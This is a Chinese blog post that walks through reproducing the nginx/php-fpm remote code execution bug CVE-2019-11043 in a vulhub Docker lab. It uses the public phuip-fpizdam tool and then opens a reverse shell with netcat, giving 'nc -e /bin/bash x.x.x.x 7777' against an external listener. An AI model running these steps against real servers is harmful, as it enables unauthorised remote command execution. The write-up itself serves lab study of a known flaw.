<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" >

<title>CVE-2019-11043漏洞复现&amp;&amp;反弹shell | Yyx</title>

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://www.yyxyy.xyz//favicon.ico?v=1623226191992">
<link rel="stylesheet" href="https://www.yyxyy.xyz//styles/main.css">



<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>



    <meta name="description" content="CVE-2019-11043漏洞复现&amp;&amp;反弹shell
1.漏洞介绍
nginx + php-fpm 配置不当，当nginx配置文件中有fastcgi_split_path_info，却没有if(!-documentroot..." />
    <meta name="keywords" content="漏洞复现" />
  </head>
  <body>
    <div id="app" class="main">

      <div class="sidebar" :class="{ 'full-height': menuVisible }">
  <div class="top-container" data-aos="fade-right">
    <div class="top-header-container">
      <a class="site-title-container" href="https://www.yyxyy.xyz/">
        <img src="https://www.yyxyy.xyz//images/avatar.png?v=1623226191992" class="site-logo">
        <h1 class="site-title">Yyx</h1>
      </a>
      <div class="menu-btn" @click="menuVisible = !menuVisible">
        <div class="line"></div>
      </div>
    </div>
    <div>
      
        
          <a href="/" class="site-nav">
            首页
          </a>
        
      
        
          <a href="/archives" class="site-nav">
            归档
          </a>
        
      
        
          <a href="/tags" class="site-nav">
            标签
          </a>
        
      
        
          <a href="/post/about" class="site-nav">
            关于
          </a>
        
      
    </div>
  </div>
  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
    <div class="social-container">
      
        
      
        
      
        
      
        
      
        
      
    </div>
    <div class="site-description">
      记得在这杂乱的生活里，带点微笑
    </div>
    <div class="site-footer">
      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://www.yyxyy.xyz//atom.xml" target="_blank">RSS</a>
    </div>
  </div>
</div>


      <div class="main-container">
        <div class="content-container" data-aos="fade-up">
          <div class="post-detail">
            <h2 class="post-title">CVE-2019-11043漏洞复现&amp;&amp;反弹shell</h2>
            <div class="post-date">2021-06-06</div>
            
            <div class="post-content" v-pre>
              <h3 id="cve-2019-11043漏洞复现反弹shell">CVE-2019-11043漏洞复现&amp;&amp;反弹shell</h3>
<h4 id="1漏洞介绍">1.漏洞介绍</h4>
<p>nginx + php-fpm 配置不当，当nginx配置文件中有<code>fastcgi_split_path_info</code>，却没有if(!-<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>o</mi><mi>c</mi><mi>u</mi><mi>m</mi><mi>e</mi><mi>n</mi><msub><mi>t</mi><mi>r</mi></msub><mi>o</mi><mi>o</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">document_root</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">o</span><span class="mord mathdefault">c</span><span class="mord mathdefault">u</span><span class="mord mathdefault">m</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord"><span class="mord mathdefault">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.02778em;">r</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">o</span><span class="mord mathdefault">t</span></span></span></span>fastcgi_script_name){return 404;}`的时候就会导致远程代码执行。</p>
<p>像服务器url发送%0a时，服务器返回异常。</p>
<p>该漏洞需要在nginx.conf中进行特定配置才能触发。具体配置如下：</p>
<pre><code class="language-nginx">location ~ [^/]\.php(/|$) {
 ...
 fastcgi_split_path_info ^(.+?\.php)(/.*)$;
 fastcgi_param PATH_INFO $fastcgi_path_info;
 fastcgi_pass   php:9000;
 ...
}
</code></pre>
<p>攻击者可以使用换行符（％0a）来破坏<code>fastcgi_split_path_info</code>指令中的Regexp。 Regexp被损坏导致PATH_INFO为空，从而触发该漏洞。</p>
<p>fastcgi_split_path_info：<a href="https://segmentfault.com/a/1190000002667095">https://segmentfault.com/a/1190000002667095</a></p>
<h4 id="2漏洞复现">2.漏洞复现</h4>
<p>环境使用的vulhub</p>
<p>具体参考：<a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
<p>环境需要 docker、golang</p>
<pre><code class="language-shell">sudo apt-get install docker docker-compose
sudo apt install golang
</code></pre>
<p>环境搭建完成打开127.0.0.1:8080就能访问</p>
<figure data-type="image" tabindex="1"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/1.png" alt="" loading="lazy"></figure>
<p>安装漏洞利用工具</p>
<pre><code class="language-shell">git clone https://github.com/neex/phuip-fpizdam.git
cd phuip-fpizdam
go get -v &amp;&amp; go build
</code></pre>
<p>漏洞利用</p>
<figure data-type="image" tabindex="2"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/2.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="3"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/3.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="4"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/4.png" alt="" loading="lazy"></figure>
<figure data-type="image" tabindex="5"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/5.png" alt="" loading="lazy"></figure>
<h5 id="反弹shell">反弹shell</h5>
<p>想的是用nc反弹shell，然后发现docker环境里面没有nc，只好自己安装nc了</p>
<figure data-type="image" tabindex="6"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/6.png" alt="" loading="lazy"></figure>
<pre><code class="language-powershell">apt update
apt-get install netcat
</code></pre>
<figure data-type="image" tabindex="7"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/7.png" alt="" loading="lazy"></figure>
<p>nc安装完毕</p>
<pre><code class="language-shell">#现在外网服务器上面监听 
nc -lvp 7777

#再用 nc -e /bin/bash x.x.x.x 7777 反弹shell 
</code></pre>
<figure data-type="image" tabindex="8"><img src="https://yyxyy-1259114291.cos.ap-chengdu.myqcloud.com/vulhub/CVE-2019-11043/8.png" alt="" loading="lazy"></figure>
<h5 id="参考链接">参考链接</h5>
<p><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md">https://github.com/vulhub/vulhub/blob/master/php/CVE-2019-11043/README.zh-cn.md</a></p>
<p><a href="https://github.com/neex/phuip-fpizdam/issues/1">https://github.com/neex/phuip-fpizdam/issues/1</a></p>
<p><a href="https://bugs.php.net/bug.php?id=78599">https://bugs.php.net/bug.php?id=78599</a></p>
<p><a href="http://blog.leanote.com/post/snowming/9da184ef24bd">http://blog.leanote.com/post/snowming/9da184ef24bd</a></p>

            </div>
            
              <div class="tag-container">
                
                  <a href="https://www.yyxyy.xyz/tag/RIn8eHN5X/" class="tag">
                    漏洞复现
                  </a>
                
              </div>
            
            
              <div class="next-post">
                <div class="next">下一篇</div>
                <a href="https://www.yyxyy.xyz/post/php_xxe/">
                  <h3 class="post-title">
                    php_xxe
                  </h3>
                </a>
              </div>
            

            

          </div>

        </div>
      </div>
    </div>

    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
<script type="application/javascript">

AOS.init();

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>






  </body>
</html>
